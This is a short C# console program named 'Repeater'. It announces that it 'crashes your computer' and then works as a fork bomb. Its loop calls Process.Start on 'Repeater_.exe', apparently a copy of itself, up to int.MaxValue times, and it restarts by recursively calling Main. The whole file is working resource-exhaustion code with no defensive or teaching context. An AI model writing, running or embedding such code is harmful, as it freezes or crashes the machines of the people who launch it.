using System;
using System.Diagnostics;
namespace Repeater
{
    public static class Repeat
    {
        public const string InternalVersion = "1.0.7";
        static int x;
        public static void Main()
        {
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.BackgroundColor = ConsoleColor.DarkRed;
            Console.Title = "Repeater" + " v" + InternalVersion;
            Console.Out.WriteLine("You just launched a program that crashes your computer");
            Console.Out.Flush();
            Count();
        }
        static void Count()
        {
            while (x != int.MaxValue)
            {
                x++;
                Console.Out.WriteLine(x);
                Console.Out.Flush();
                Process.Start("Repeater_.exe");
            }
            if (x == int.MaxValue)
            {
                Console.Out.WriteLine("Max limit reached!");
                Console.Out.Flush();
                x = 0;
                Console.Out.WriteLine("Press any key to restart!");
                Console.Out.Flush();
                Console.ReadKey();
                Main();
            }
        }
    }
}